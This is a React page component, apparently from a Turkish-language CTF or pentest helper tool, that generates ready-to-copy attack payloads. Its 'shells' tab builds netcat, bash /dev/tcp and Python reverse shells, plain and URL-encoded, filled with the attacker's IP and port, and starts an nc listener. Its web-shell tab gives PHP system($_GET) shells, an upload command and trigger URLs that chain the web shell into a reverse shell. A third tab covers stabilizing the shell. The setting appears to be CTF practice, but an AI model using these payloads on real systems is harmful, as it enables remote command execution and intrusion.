import { useRef, useState } from 'react';
import { useJobs } from '../context/JobContext';
import { useSocket } from '../context/SocketContext';
import { useTerminal } from '../hooks/useTerminal';
import { InfoCard, CmdLine, SectionTitle } from '../components/InfoCard';
import { sendCmd } from '../utils/helpers';
import { useLanguage } from '../context/LanguageContext';

const termId = 'shell-main';

export default function PhpShellPage({ onBack }) {
  const { t } = useLanguage();
  const { activeJob, updateJob } = useJobs();
  const { socket } = useSocket();
  const [myIp, setMyIp] = useState('10.10.x.x');
  const [port, setPort] = useState('4444');
  const [targetIp, setTargetIp] = useState(activeJob?.ip || '');
  const [tab, setTab] = useState('shells');

  const containerRef = useRef(null);
  const { isReady } = useTerminal(termId, containerRef);

  const SHELLS = [
    {
      id: 1,
      title: t('shell_diff_1').split(':')[0],
      cmd: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc KENDI_IP PORT >/tmp/f',
      urlEncoded: 'rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20KENDI_IP%20PORT%20%3E%2Ftmp%2Ff',
      desc: t('shell_diff_1').substring(t('shell_diff_1').indexOf(':') + 2),
      color: 'green',
    },
    {
      id: 2,
      title: t('shell_diff_2').split(':')[0],
      cmd: `bash -c 'bash -i >& /dev/tcp/KENDI_IP/PORT 0>&1'`,
      urlEncoded: `bash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FKENDI_IP%2FPORT%200%3E%261'`,
      desc: t('shell_diff_2').substring(t('shell_diff_2').indexOf(':') + 2),
      color: 'cyan',
    },
    {
      id: 3,
      title: t('shell_diff_3').split(':')[0],
      cmd: `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("KENDI_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`,
      urlEncoded: `python3%20-c%20'import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect(("KENDI_IP"%2CPORT))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bpty.spawn("%2Fbin%2Fbash")'`,
      desc: t('shell_diff_3').substring(t('shell_diff_3').indexOf(':') + 2),
      color: 'purple',
    },
  ];

  const replaceShell = (cmd) => cmd.replace(/KENDI_IP/g, myIp).replace(/PORT/g, port);
  const replaceUrl = (cmd) => cmd.replace(/KENDI_IP/g, myIp).replace(/PORT/g, port).replace(/port/g, port);

  const listen = () => sendCmd(socket, termId, `nc -lnvp ${port}`);

  return (
    <div>
      <div className="page-header">
        <div>
          <div className="page-header-back" onClick={onBack}>{t('back_to_menu')}</div>
          <div className="page-title">🐚 <span>{t('php_shell_title')}</span></div>
          <div className="page-subtitle">{t('php_shell_desc')}</div>
        </div>
      </div>

      <div className="page-tabs">
        {['shells', 'webshell', 'stabilize'].map(t_id => (
          <div key={t_id} className={`page-tab ${tab === t_id ? 'active' : ''}`} onClick={() => setTab(t_id)}>
            {t_id === 'shells' ? t('rs_tab') : t_id === 'webshell' ? t('ws_tab') : t('stabilize_tab')}
          </div>
        ))}
      </div>

      {tab === 'shells' && (
        <>
          <div style={{ display: 'flex', gap: 10, marginBottom: 16, flexWrap: 'wrap', alignItems: 'flex-end' }}>
            <div className="form-group" style={{ flex: 1 }}>
              <label className="form-label">{t('my_ip')}</label>
              <input className="form-input" value={myIp} onChange={e => setMyIp(e.target.value)} placeholder="10.10.x.x" />
            </div>
            <div className="form-group">
              <label className="form-label">{t('port_listen')}</label>
              <input className="form-input" value={port} onChange={e => setPort(e.target.value)} style={{ width: 90 }} />
            </div>
            <button className="btn btn-green" onClick={listen}>👂 {t('nc_listen').split(' ')[1]}</button>
          </div>

          <div className="terminal-container" style={{ height: 220, marginBottom: 16 }}>
            <div className="terminal-titlebar">
              <div className="terminal-dots">
                <div className="terminal-dot red" /><div className="terminal-dot yellow" /><div className="terminal-dot green" />
              </div>
              <div className="terminal-title">
                {isReady ? <span style={{ color: 'var(--accent-green)' }}>● nc {t('listener_nc').split(' ')[1]}</span> : <span style={{ color: 'var(--text-muted)' }}>○ {t('connecting')}</span>}
              </div>
            </div>
            <div ref={containerRef} style={{ height: 182, padding: '4px 2px' }} />
          </div>

          <div style={{ marginTop: 16 }}>
            {SHELLS.map(s => (
              <div key={s.id} className="info-panel" style={{ marginBottom: 12 }}>
                <div className="info-panel-header" style={{ cursor: 'default', color: `var(--accent-${s.color === 'green' ? 'green' : s.color === 'cyan' ? 'cyan' : 'purple'})` }}>
                  {s.title}
                </div>
                <div className="info-panel-body">
                  <div className="cmd-desc">{s.desc}</div>
                  <div className="cmd-row">
                    <div className="cmd-box" style={{ fontSize: 11 }}>{replaceShell(s.cmd)}</div>
                    <button className="cmd-send-btn" onClick={() => navigator.clipboard.writeText(replaceShell(s.cmd))}>📋</button>
                  </div>
                  <div style={{ marginTop: 8 }}>
                    <div style={{ fontSize: 10, color: 'var(--text-muted)', marginBottom: 4 }}>{t('url_encoded_hint')}</div>
                    <div className="cmd-box" style={{ fontSize: 10, color: 'var(--accent-yellow)' }}>
                      ?cmd={replaceUrl(s.urlEncoded)}
                    </div>
                  </div>
                </div>
              </div>
            ))}
          </div>

          <InfoCard title={t('shell_diff_title')} icon="🆚" color="orange">
            <div className="cmd-desc">
              <b>1. NC</b>: {t('shell_diff_1').substring(t('shell_diff_1').indexOf(':') + 2)}<br /><br />
              <b>2. Bash</b>: {t('shell_diff_2').substring(t('shell_diff_2').indexOf(':') + 2)}<br /><br />
              <b>3. Python3</b>: {t('shell_diff_3').substring(t('shell_diff_3').indexOf(':') + 2)}
            </div>
          </InfoCard>
        </>
      )}

      {tab === 'webshell' && (
        <>
          <div className="alert alert-orange">
            <span>⚠</span>
            <span>{t('ws_warning')}</span>
          </div>
          <SectionTitle icon="🌐">{t('ws_create_title')}</SectionTitle>
          <InfoCard title={t('ws_simple_title')} icon="🐚" defaultOpen color="green">
            <div className="cmd-desc">{t('ws_simple_desc1')}</div>
            <div className="cmd-box" style={{ fontSize: 12, marginBottom: 8 }}>{'<?php echo system($_GET[\'komut\']); ?>'}</div>
            <div className="cmd-desc">{t('ws_simple_desc2')}</div>
            <div className="cmd-row">
              <div className="cmd-box" style={{ fontSize: 12 }}>{'<?php system($_GET["cmd"]); ?>'}</div>
              <button className="cmd-send-btn" onClick={() => navigator.clipboard.writeText('<?php system($_GET["cmd"]); ?>')}>📋</button>
            </div>
          </InfoCard>
          <InfoCard title={t('ws_upload_title')} icon="⬆" color="purple">
            <CmdLine cmd={`echo '<?php system($_GET["cmd"]); ?>' > kabuk.php`} desc={t('ws_upload_desc1')} termId={termId} />
            <div className="cmd-desc" style={{ marginTop: 8 }}>{t('ws_upload_desc2')}</div>
            <div className="cmd-box" style={{ fontSize: 11, marginBottom: 6 }}>{`http://${targetIp || '10.10.10.10'}/kabuk.php?cmd=whoami`}</div>
            <div className="cmd-box" style={{ fontSize: 11, marginBottom: 6 }}>{`http://${targetIp || '10.10.10.10'}/kabuk.php?cmd=id`}</div>
            <div className="cmd-box" style={{ fontSize: 11 }}>{`http://${targetIp || '10.10.10.10'}/kabuk.php?cmd=cat /var/www/flag.txt`}</div>
          </InfoCard>
          <InfoCard title={t('ws_trigger_title')} icon="🚀" color="orange">
            <div className="cmd-desc">{t('ws_trigger_desc1')}</div>
            <div className="cmd-box" style={{ fontSize: 10, wordBreak: 'break-all', marginBottom: 8 }}>
              {`http://${targetIp || 'hedef.htb'}/kabuk.php?cmd=`}
              {replaceUrl(SHELLS[0].urlEncoded)}
            </div>
            <div className="cmd-desc" style={{ marginTop: 8 }}>{t('ws_trigger_desc2')}</div>
            <div className="cmd-box" style={{ fontSize: 10, wordBreak: 'break-all' }}>
              {`http://${targetIp || 'hedef.htb'}/kabuk.php?cmd=`}
              {replaceUrl(SHELLS[1].urlEncoded)}
            </div>
          </InfoCard>
        </>
      )}

      {tab === 'stabilize' && (
        <>
          <InfoCard title={t('stabilize_why_title')} icon="❓" defaultOpen color="purple">
            <div className="cmd-desc">{t('stabilize_why_desc')}</div>
          </InfoCard>
          <SectionTitle icon="⬆">{t('stabilize_steps_title')}</SectionTitle>
          <InfoCard title={t('stabilize_step1_title')} icon="1️⃣" color="green">
            <CmdLine cmd={`python3 -c 'import pty; pty.spawn("/bin/bash")'`} desc={t('stabilize_step1_desc')} />
          </InfoCard>
          <InfoCard title={t('stabilize_step2_title')} icon="2️⃣" color="cyan">
            <div className="cmd-desc">{t('stabilize_step2_desc1')}</div>
            <div className="cmd-box" style={{ marginBottom: 8 }}>Ctrl + Z</div>
            <div className="cmd-desc">{t('stabilize_step2_desc2')}</div>
            <CmdLine cmd="stty raw -echo; fg" desc={t('stabilize_step2_desc3')} />
          </InfoCard>
          <InfoCard title={t('stabilize_step3_title')} icon="3️⃣" color="orange">
            <CmdLine cmd="export TERM=xterm" desc={t('stabilize_step3_desc1')} />
            <CmdLine cmd="stty rows 24 cols 80" desc={t('stabilize_step3_desc2')} />
          </InfoCard>
          <div className="alert alert-green" style={{ marginTop: 8 }}>
            <span>✅</span>
            <span>{t('stabilize_success')}</span>
          </div>
        </>
      )}
    </div>
  );
}
